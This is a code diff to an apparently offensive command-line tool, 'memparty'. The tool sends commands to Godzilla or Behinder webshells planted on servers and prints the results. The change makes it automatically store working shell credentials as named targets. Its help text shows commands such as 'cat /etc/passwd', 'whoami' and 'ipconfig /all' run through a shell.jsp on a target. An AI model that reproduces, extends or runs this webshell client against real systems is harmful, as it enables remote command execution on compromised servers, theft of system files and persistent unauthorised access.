@@ -1,11 +1,11 @@
 import { Command, Option } from "commander";
 
-import type { GlobalOptions } from "../cli-context.js";
+import { logInfo, reportError, type GlobalOptions } from "../cli-context.js";
 import { execBehinder } from "../connect/behinder.js";
 import { execGodzilla, type GodzillaExecOptions } from "../connect/godzilla.js";
 import type { CommonConnectOptions, ExecResult } from "../connect/types.js";
 import { logOp, truncateOutput } from "../core/oplog.js";
-import { resolveConnection } from "../core/targets.js";
+import { autoSaveShell, resolveConnection } from "../core/targets.js";
 
 interface ExecCmdOptions extends GlobalOptions {
   url?: string;
@@ -19,6 +19,7 @@ interface ExecCmdOptions extends GlobalOptions {
   header?: string[];
   insecure?: boolean;
   json?: boolean;
+  save?: boolean;
 }
 
 function parseExtraHeaders(lines: string[] | undefined): Record<string, string> {
@@ -39,7 +40,7 @@ export function registerExecCommand(program: Command): void {
     .description(
       "Execute a command on a deployed webshell (Godzilla / Behinder) and print its output",
     )
-    .argument("[name]", "saved target name (see 'memparty target list')")
+    .argument("[name]", "saved target name (see 'memparty list')")
     .option("-u, --url <url>", "URL of the deployed shell (or give a saved target name)")
     .addOption(
       new Option("-t, --tool <tool>", "shell tool").choices(["godzilla", "behinder"]),
@@ -63,6 +64,7 @@ export function registerExecCommand(program: Command): void {
     .option("-H, --header <line...>", 'extra request header, e.g. -H "Cookie: a=b"')
     .option("-k, --insecure", "skip TLS certificate verification")
     .option("--json", "output raw JSON")
+    .option("--no-save", "do not auto-save the target after a successful exec")
     .addHelpText(
       "after",
       `
@@ -71,7 +73,7 @@ Examples:
       --header-value my-secret-token --cmd "whoami"
   $ memparty exec -u http://target/shell.jsp -t behinder --pass rebeyond \\
       --header-value my-secret-token --cmd "cat /etc/passwd"
-  $ memparty exec web222 --cmd "whoami"            # saved target, see 'memparty target'
+  $ memparty exec web222 --cmd "whoami"            # saved target, see 'memparty list'
   $ memparty exec -u http://target/shell.jsp -t godzilla --os windows \\
       --cmd "ipconfig /all" --json
 
@@ -97,7 +99,7 @@ the OS inside its payload, so --os does not apply.
           insecure: opts.insecure,
         });
       } catch (err) {
-        process.stderr.write(`Error: ${err instanceof Error ? err.message : String(err)}\n`);
+        reportError(err instanceof Error ? err.message : String(err), opts.json ? ["--json"] : []);
         process.exitCode = 1;
         return;
       }
@@ -134,6 +136,13 @@ the OS inside its payload, so --os does not apply.
           return;
       }
 
+      // a successful exec proves the credentials — keep them as a named target
+      let savedAs: string | undefined;
+      if (result.ok && conn.targetName === undefined && opts.save !== false) {
+        savedAs = autoSaveShell(conn);
+        conn.targetName = savedAs;
+      }
+
       const truncated = result.output !== undefined ? truncateOutput(result.output) : null;
       logOp({
         category: "exec",
@@ -150,10 +159,11 @@ the OS inside its payload, so --os does not apply.
       });
 
       if (opts.json) {
-        process.stdout.write(`${JSON.stringify(result, null, 2)}\n`);
+        process.stdout.write(`${JSON.stringify({ ...result, savedAs }, null, 2)}\n`);
       } else if (result.ok) {
         process.stdout.write(result.output ?? "");
         if (result.output && !result.output.endsWith("\n")) process.stdout.write("\n");
+        if (savedAs) logInfo(`saved as '${savedAs}' (use --no-save to skip)`);
       } else {
         process.stderr.write(`FAIL ${result.tool} ${result.url}\n     ${result.error ?? ""}\n`);
       }
